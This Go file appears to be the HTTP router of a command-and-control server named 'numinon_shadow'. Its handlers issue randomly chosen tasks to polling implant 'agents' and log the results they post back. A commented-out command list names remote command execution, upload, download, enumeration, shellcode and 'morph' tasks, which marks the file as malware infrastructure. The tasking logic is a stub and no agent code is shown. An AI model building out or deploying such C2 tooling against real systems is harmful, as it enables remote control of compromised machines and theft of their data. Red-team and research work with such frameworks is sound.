package router

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"numinon_shadow/internal/models"
	"time"
)

// CheckinHandler processes requests from clients checking in for tasks.
func CheckinHandler(w http.ResponseWriter, r *http.Request) {

	agentID := r.Header.Get("Agent-ID") // Read the custom header
	log.Printf("|✅ CHK_IN| Received check-in %s from Agent ID: %s via %s", r.Method, agentID, r.RemoteAddr)

	var response models.ServerTaskResponse

	// Randomly decide if a task is available (50/50 chance).
	if seededRand.Intn(2) == 0 {
		// No task is available.
		response.TaskAvailable = false
		log.Printf("No command issued to Agent")
	} else {
		// A task is available, so populate the details.
		response.TaskAvailable = true
		response.TaskID = generateTaskID()

		// Randomly select a command.
		commands := []string{"hop"}
		// commands := []string{"runcmd", "upload", "download", "enumerate", "shellcode", "morph", "hop", "doesnotexist"}
		response.Command = commands[seededRand.Intn(len(commands))]

		// The 'Data' field is intentionally left empty as requested.
		response.Data = nil

		log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s\n", response.Command, response.TaskID, agentID)

	}

	// Set the content type header to indicate a JSON response.
	w.Header().Set("Content-Type", "application/json")

	// Marshal the response struct into JSON.
	jsonResponse, err := json.Marshal(response)
	if err != nil {
		// If marshaling fails, log the error and send a server error response.
		http.Error(w, "Error creating response", http.StatusInternalServerError)
		return
	}

	// Write the JSON response to the client.
	w.WriteHeader(http.StatusOK)
	w.Write(jsonResponse)
}

func ResultsHandler(w http.ResponseWriter, r *http.Request) {

	agentID := r.Header.Get("Agent-ID")
	log.Printf("|✅ CHK_IN| Received results POST from Agent ID: %s via %s", agentID, r.RemoteAddr)

	// Read the raw body from the request
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("|❗ERR RESULT|-> Error reading result body from agent %s: %v\n", agentID, err)
		return
	}
	defer r.Body.Close()

	// --- PRETTY PRINT LOGIC STARTS HERE ---

	// 1. Unmarshal the raw JSON into our AgentTaskResult struct
	var result models.AgentTaskResult
	if err := json.Unmarshal(body, &result); err != nil {
		log.Printf("|❗ERR RESULT|-> Error unmarshaling result JSON from agent %s: %v\n", agentID, err)
		return
	}

	// Create a temporary struct for logging so we can display output as a string
	prettyResult := struct {
		TaskID string `json:"task_id"`
		Status string `json:"status"`
		Output string `json:"output"` // Changed to string for display
		Error  string `json:"error"`
	}{
		TaskID: result.TaskID,
		Status: result.Status,
		Output: string(result.Output), // Convert byte slice to string here
		Error:  result.Error,
	}

	// 2. Re-marshal the struct into a "pretty" indented JSON string
	prettyJSON, err := json.MarshalIndent(prettyResult, "", "  ") // Using two spaces for indentation
	if err != nil {
		log.Printf("|❗ERR RESULT|-> Error re-marshaling for pretty printing: %v\n", err)
	}
	log.Printf("|✅ RESULT| Received results POST from Agent ID: %s via %s\n--- Task Result ---\n%s\n-------------------\n", agentID, r.RemoteAddr, string(prettyJSON))

	// --- PRETTY PRINT LOGIC ENDS HERE ---

	// Respond to the agent to confirm receipt
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Result received"))
}

// seededRand is a random number generator seeded at application start.
var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))

// generateTaskID creates a random task identifier.
func generateTaskID() string {
	return fmt.Sprintf("task_%06d", seededRand.Intn(1000000))
}
